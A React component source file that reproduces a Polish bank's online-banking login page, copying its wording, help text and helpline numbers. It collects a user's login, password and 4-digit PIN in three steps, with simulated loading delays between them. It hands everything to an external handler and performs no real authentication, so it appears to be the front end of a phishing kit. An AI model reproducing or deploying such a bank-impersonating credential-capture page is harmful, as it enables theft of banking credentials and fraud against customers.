import indicator from "../res/files/indicator-ver-75BEEBCC0A276C3974D2524B7F0619E1.gif";
import log_question_big from "../res/files/log_question_big.png";
import log_excl_gray from "../res/files/log_excl_gray.png";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import * as yup from "yup";
import React, {useState} from "react";
import {Form} from "reactstrap";

const schema = yup.object().shape({
    login: yup.string().required().min(6).max(20),
    password: yup.string().required(),
    pin: yup.string().required().matches(/^[0-9]{4}$/)
});

const CentrumFormLogin = ({handler}) => {
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const {register, handleSubmit, trigger, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onBlur'
    });

    const load = (index) => {
        setLoading(true);

        setTimeout(() => {
            setLoading(false);
            setStep(index);
        }, 1500)
    }
    const clearForm = (data) => {
        console.log(data);
        setLoading(false);
        setStep(1);
        reset();
        handler(data);
    }
    return (
        <div id="logowanie" className="logowanie loginPanel">
            <h1>
                <div>
                    Logowanie KROK&nbsp;{step}
                </div>
            </h1>
            <Form onSubmit={handleSubmit(clearForm)}>
                {
                    step === 1 ?
                        <div id="logowanie-inner-NIK" key={'login'}>
                            <div className="nikForm f1">
                                <div className="forms">
                                    <div className="labelsLine" id="labelContainer">
                                        <label htmlFor="input_nik" id="niklabelk1">
                                        <span className="login-step-instruction">
                                            <strong>Wpisz login</strong>
                                        </span>
                                        </label>
                                    </div>
                                    <div className="feedbackDiv input">
                                        {
                                            errors.login ?
                                                errors.login.type === 'required' ?
                                                    <span>
                                                        <ul className="feedbackPanel">
                                                            <li className="feedbackPanelERROR">
                                                                <span>Pole wymagane.</span>
                                                            </li>
                                                        </ul>
                                                    </span> :
                                                    errors.login.type === 'min' || errors.login.type === 'max' ?
                                                        <span>
                                                        <ul className="feedbackPanel">
                                                            <li className="feedbackPanelERROR">
                                                                <span>W polu NIK wprowadź od 6 do 20 znaków.</span>
                                                            </li>
                                                        </ul>
                                                </span> : null : null
                                        }

                                        <input
                                            className={`content_center_input input-login ${errors.login && 'invalid'}`}
                                            autoComplete="off"
                                            {...register('login')}
                                        />
                                    </div>
                                    <div className="button-next">
                                        <button type="button"
                                                className="btn"
                                                disabled={loading}
                                                onClick={() => {
                                                    console.log(errors)
                                                    trigger('login').then((res) => {
                                                        if (res) {
                                                            load(2);
                                                        }
                                                    })
                                                }}
                                        >
                                            Dalej
                                        </button>
                                        {
                                            loading &&
                                            <span className="wicket-ajax-indicator">
                                                <img src={indicator} alt=""/>
                                            </span>
                                        }
                                    </div>
                                    <div id="akcje">
                                        <div id="accessDiv">
                                            <a data-toggle="modal" data-target="#idc">
                                                <span>Jak uzyskać dostęp?</span>
                                            </a>
                                            <div id="idc" className="modal fade" role="dialog"
                                                 aria-labelledby="myModalLabel"
                                                 aria-hidden="true">
                                                <div className="modal-dialog">
                                                    <div className="modal-content">
                                                        <div className="modal-header">
                                                            <h1 className="modal-title">
                                                                <img className="modal-header-icon"
                                                                     src={log_question_big}/>
                                                                <span>Jak uzyskać dostęp?</span>
                                                            </h1>
                                                            <button type="button"
                                                                    className="close"
                                                                    data-dismiss="modal"
                                                                    aria-hidden="true"/>
                                                        </div>
                                                        <div className="modal-body">
                                                            <div>
                                                                <div id="tipGainAccess">
                                                                    <p>Do zalogowania się potrzebujesz:</p>
                                                                    <div id="tipGainAccessDiv">
                                                                        <div>
                                                                            <p><strong>Login</strong><br/>To NIK lub
                                                                                Twój
                                                                                własny login. NIK
                                                                                znajdziesz w umowie bankowości
                                                                                internetowej
                                                                                i mobilnej. Własny login
                                                                                możesz samodzielnie zdefiniować i
                                                                                używać
                                                                                zamiennie z NIK.</p>
                                                                        </div>
                                                                        <div>
                                                                            <p><strong>Hasło</strong><br/>To hasło
                                                                                ustawione
                                                                                przez Ciebie lub hasło
                                                                                startowe, jeśli logujesz się po raz
                                                                                pierwszy. Hasło startowe znajdziesz
                                                                                w
                                                                                SMS-ie, w e-mailu lub w kopercie.
                                                                            </p>
                                                                        </div>
                                                                    </div>
                                                                    <img id="exclamation-icon"
                                                                         src={log_excl_gray}/>
                                                                    <p><b>Nie pamiętasz hasła?</b> Skontaktuj
                                                                        się z nami pod
                                                                        numerem 1 9999
                                                                        lub +48 61 81 19999, jeśli dzwonisz z
                                                                        zagranicy.
                                                                        Możesz też pójść do
                                                                        oddziału. Doradca ustawi Ci nowe hasło.
                                                                    </p>
                                                                    <p><b>Nie masz NIK-u?</b> Podpisz umowę
                                                                        bankowości
                                                                        internetowej i mobilnej. Odwiedź nasz
                                                                        oddział lub
                                                                        skontaktuj się z Doradcą online.</p>
                                                                    <p></p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>


                                        </div>
                                    </div>
                                    <div id="reset-password-link">
                                        <span>Problem z logowaniem?</span>
                                        <span id="redirect-link">Zresetuj swoje hasło</span>
                                    </div>
                                </div>
                            </div>
                        </div> :
                        step === 2 ?
                            <div id="logowanie-inner" key={'pass'}>
                                <div className="f1 masked_margin">
                                    <div className="forms">
                                        <div id="pinDiv">
                                            <div className="labelsLine" id="labelContainer">
                                                <div style={{float: 'left'}}>
                                                    <div id="pinlabel">
                                                        <span className="login-step-instruction">Wpisz hasło</span>
                                                    </div>
                                                </div>
                                            </div>
                                            <div className="feedbackDiv input">
                                                {
                                                    (function () {
                                                        if (errors.password) {
                                                            return (
                                                                <span>
                                                                <ul className="feedbackPanel">
                                                                    <li className="feedbackPanelERROR">
                                                                        <span>Pole wymagane.</span>
                                                                    </li>
                                                                </ul>
                                                            </span>
                                                            )
                                                        }
                                                    })()
                                                }

                                                <input
                                                    className={`content_center_input input-login ${errors.password && 'invalid'}`}
                                                    autoComplete="off"
                                                    type={'password'}
                                                    {...register('password')}
                                                />
                                            </div>
                                            <div className="button-next-step2">
                                                <button type="button"
                                                        className="btn"
                                                        onClick={() => {
                                                            trigger('password').then(res => {
                                                                if (res) {
                                                                    load(3)
                                                                }
                                                            })
                                                        }}
                                                >Dalej
                                                </button>
                                                {
                                                    loading &&
                                                    <span className="wicket-ajax-indicator">
                                                    <img src={indicator} alt=""/>
                                                </span>
                                                }
                                            </div>
                                        </div>
                                        <div id="akcje">
                                            <div id="accessDiv">
                                                <a data-toggle="modal" data-target="#id4">
                                                    <span>Jak uzyskać dostęp?</span>
                                                </a>
                                                <div id="id4" className="modal fade" role="dialog"
                                                     aria-labelledby="myModalLabel" aria-hidden="true">
                                                    <div className="modal-dialog">
                                                        <div className="modal-content">
                                                            <div className="modal-header">
                                                                <h1 className="modal-title">
                                                                    <img className="modal-header-icon"
                                                                         src={log_question_big}/>
                                                                    <span>Jak uzyskać dostęp?</span>
                                                                </h1>
                                                                <button type="button" className="close"
                                                                        data-dismiss="modal" aria-hidden="true"/>
                                                            </div>
                                                            <div className="modal-body">
                                                                <div>
                                                                    <div id="tipGainAccess">
                                                                        <p>Do zalogowania się potrzebujesz:</p>
                                                                        <div id="tipGainAccessDiv">
                                                                            <div>
                                                                                <p><strong>Login</strong><br/>To NIK lub
                                                                                    Twój
                                                                                    własny login. NIK znajdziesz w
                                                                                    umowie
                                                                                    bankowości internetowej i mobilnej.
                                                                                    Własny login możesz samodzielnie
                                                                                    zdefiniować i używać zamiennie z
                                                                                    NIK.
                                                                                </p>
                                                                            </div>
                                                                            <div>
                                                                                <p><strong>Hasło</strong><br/>To hasło
                                                                                    ustawione przez Ciebie lub hasło
                                                                                    startowe, jeśli logujesz się po raz
                                                                                    pierwszy. Hasło startowe znajdziesz
                                                                                    w
                                                                                    SMS-ie, w e-mailu lub w kopercie.
                                                                                </p>
                                                                            </div>
                                                                        </div>
                                                                        <img id="exclamation-icon"
                                                                             src={log_excl_gray}/>
                                                                        <p><b>Nie pamiętasz hasła?</b> Skontaktuj się z
                                                                            nami pod numerem 1 9999 lub +48 61 81 19999,
                                                                            jeśli dzwonisz z zagranicy. Możesz też pójść
                                                                            do oddziału. Doradca ustawi Ci nowe hasło.
                                                                        </p>
                                                                        <p><b>Nie masz NIK-u?</b> Podpisz umowę
                                                                            bankowości internetowej i mobilnej. Odwiedź
                                                                            nasz oddział lub skontaktuj się z Doradcą
                                                                            online.</p>
                                                                        <p/>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="reset-password-link">
                                            <span>Problem z logowaniem?</span>
                                            <span id="redirect-link">Zresetuj swoje hasło</span>
                                        </div>
                                    </div>
                                </div>
                            </div> :
                            step === 3 ?
                                <div id="logowanie-inner" key={'pin'}>
                                    <div className="f1 masked_margin">
                                        <div className="forms">
                                            <div id="pinDiv">
                                                <div className="labelsLine" id="labelContainer">
                                                    <div style={{float: 'left'}}>
                                                        <div id="pinlabel">
                                                    <span
                                                        className="login-step-instruction">Wpisz PIN</span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div className="feedbackDiv input">
                                                    {
                                                        (function (){
                                                            if(errors.pin){
                                                                if (errors.pin.type === 'required'){
                                                                    return (
                                                                        <span>
                                                                            <ul className="feedbackPanel">
                                                                                <li className="feedbackPanelERROR">
                                                                                    <span>Pole wymagane.</span>
                                                                                </li>
                                                                            </ul>
                                                                        </span>
                                                                    )
                                                                }
                                                                else if(errors.pin.type === 'matches'){
                                                                    return (
                                                                        <span>
                                                                            <ul className="feedbackPanel">
                                                                                <li className="feedbackPanelERROR">
                                                                                    <span>Pole składa się z 4 cyfr.</span>
                                                                                </li>
                                                                            </ul>
                                                                        </span>
                                                                    )
                                                                }
                                                            }
                                                        })
                                                    }
                                                    <input
                                                        className={`content_center_input input-code ${errors.pin && 'invalid'}`}
                                                        type={'number'}
                                                        autoComplete="off"
                                                        {...register('pin')} />
                                                </div>
                                                <div className="button-next-step2">
                                                    <button type="submit"
                                                            className="btn"
                                                    >Dalej
                                                    </button>
                                                </div>
                                            </div>
                                            <div id="akcje">
                                                <div id="accessDiv">
                                                    <a data-toggle="modal" data-target="#id4">
                                                        <span>Jak uzyskać dostęp?</span>
                                                    </a>
                                                    <div id="id4" className="modal fade" role="dialog"
                                                         aria-labelledby="myModalLabel" aria-hidden="true">
                                                        <div className="modal-dialog">
                                                            <div className="modal-content">
                                                                <div className="modal-header">
                                                                    <h1 className="modal-title">
                                                                        <img className="modal-header-icon"
                                                                             src={log_question_big}/>
                                                                        <span>Jak uzyskać dostęp?</span>
                                                                    </h1>
                                                                    <button type="button" className="close"
                                                                            data-dismiss="modal" aria-hidden="true"/>
                                                                </div>
                                                                <div className="modal-body">
                                                                    <div>
                                                                        <div id="tipGainAccess">
                                                                            <p>Do zalogowania się potrzebujesz:</p>
                                                                            <div id="tipGainAccessDiv">
                                                                                <div>
                                                                                    <p><strong>Login</strong><br/>To NIK
                                                                                        lub
                                                                                        Twój
                                                                                        własny login. NIK znajdziesz w
                                                                                        umowie
                                                                                        bankowości internetowej i
                                                                                        mobilnej.
                                                                                        Własny login możesz samodzielnie
                                                                                        zdefiniować i używać zamiennie z
                                                                                        NIK.
                                                                                    </p>
                                                                                </div>
                                                                                <div>
                                                                                    <p><strong>Hasło</strong><br/>To
                                                                                        hasło
                                                                                        ustawione przez Ciebie lub hasło
                                                                                        startowe, jeśli logujesz się po
                                                                                        raz
                                                                                        pierwszy. Hasło startowe
                                                                                        znajdziesz
                                                                                        w
                                                                                        SMS-ie, w e-mailu lub w
                                                                                        kopercie.
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                            <img id="exclamation-icon"
                                                                                 src={log_excl_gray}/>
                                                                            <p><b>Nie pamiętasz hasła?</b> Skontaktuj
                                                                                się z
                                                                                nami pod numerem 1 9999 lub +48 61 81
                                                                                19999,
                                                                                jeśli dzwonisz z zagranicy. Możesz też
                                                                                pójść
                                                                                do oddziału. Doradca ustawi Ci nowe
                                                                                hasło.
                                                                            </p>
                                                                            <p><b>Nie masz NIK-u?</b> Podpisz umowę
                                                                                bankowości internetowej i mobilnej.
                                                                                Odwiedź
                                                                                nasz oddział lub skontaktuj się z
                                                                                Doradcą
                                                                                online.</p>
                                                                            <p/>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div id="reset-password-link">
                                                <span>Problem z logowaniem?</span>
                                                <span id="redirect-link">Zresetuj swoje hasło</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                : null
                }
            </Form>
        </div>
    )
}
export default CentrumFormLogin;